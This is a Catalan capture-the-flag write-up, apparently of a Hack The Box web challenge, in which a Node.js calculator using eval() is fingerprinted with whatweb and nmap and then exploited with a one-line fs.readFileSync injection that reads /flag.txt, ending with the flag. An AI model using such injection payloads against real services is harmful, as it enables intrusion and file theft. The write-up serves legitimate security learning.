Anem a la IP + port que se'ns dóna:

Veiem el que bàsicament és una calculadora. El que veiem al text que ens mostra la web és que hi ha la funció eval() que fa que ens puguin injectar codi, per tant, sempre la hem d’evitar. La funció interpreta el que posem a dins hi posem el que hi posem.

El que podem començar fent contra aquesta web amb la IP i port que tenim és fer whatweb (és el mateix que l’extensió Wappalyzer):


```
`┌──(root㉿polkali)-[/home/polkali]

└─# whatweb http://94.237.48.205:56687/

http://94.237.48.205:56687/ [200 OK] Bootstrap[4.3.1], Country[FINLAND][FI], IP[94.237.48.205], JQuery, Script[text/javascript], Title[🦑calc 0.1], X-Powered-By[Express]
````
  

Veiem que la web està feta amb X-Powered-By[Express] i ho busquem al navegador veiem que Express és:

  Express **es el framework web más popular de Node, y es la librería subyacente para un gran número de otros frameworks web de Node populares**. Proporciona mecanismos para: Escritura de manejadores de peticiones con diferentes verbos HTTP en diferentes caminos URL (rutas).17 oct 2023

I veiem que està en Node, ja coneixem el llenguatje, que és Javascript del costat del servidor.

  
Ara tirarem un nmap:

```
`┌──(root㉿polkali)-[/home/polkali]

└─# nmap -p 56687 -sV -v 94.237.48.205

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-21 18:29 CET

NSE: Loaded 46 scripts for scanning.

Initiating Ping Scan at 18:29

Scanning 94.237.48.205 [4 ports]

Completed Ping Scan at 18:29, 0.02s elapsed (1 total hosts)

Initiating Parallel DNS resolution of 1 host. at 18:29

Completed Parallel DNS resolution of 1 host. at 18:29, 0.00s elapsed

Initiating SYN Stealth Scan at 18:29

Scanning 94-237-48-205.uk-lon1.upcloud.host (94.237.48.205) [1 port]

Discovered open port 56687/tcp on 94.237.48.205

Completed SYN Stealth Scan at 18:29, 0.04s elapsed (1 total ports)

Initiating Service scan at 18:29

Scanning 1 service on 94-237-48-205.uk-lon1.upcloud.host (94.237.48.205)

Completed Service scan at 18:29, 11.15s elapsed (1 service on 1 host)

NSE: Script scanning 94.237.48.205.

Initiating NSE at 18:29

Completed NSE at 18:29, 0.17s elapsed

Initiating NSE at 18:29

Completed NSE at 18:29, 0.14s elapsed

Nmap scan report for 94-237-48-205.uk-lon1.upcloud.host (94.237.48.205)

Host is up (0.0046s latency).

  

PORT STATE SERVICE VERSION

56687/tcp open http Node.js Express framework

  
Read data files from: /usr/bin/../share/nmap

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds

Raw packets sent: 5 (196B) | Rcvd: 2 (84B)`
```


Veiem com efectivament estpa obert el port per TCP i que a darrere hi tenim un Node.js Express framework.

Buscarem al navegador com llegir fitxers amb Node.js és a dir fer un cat amb Node. Amb una sola línia treurem la flag injectant a que sempre que injectem hem de posar totes les comandes amb una sola línia. Sempre amb coses així hem de buscar Oneliners i [https://book.hacktricks.xyz/welcome/readme](https://book.hacktricks.xyz/welcome/readme) ens pot servir per fer-ho.

La comanda amb una línia que hem fet és la següent, mirant la documentació de Node.js:


``require('fs').readFileSync('/flag.txt').toString();``

 
**HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}**
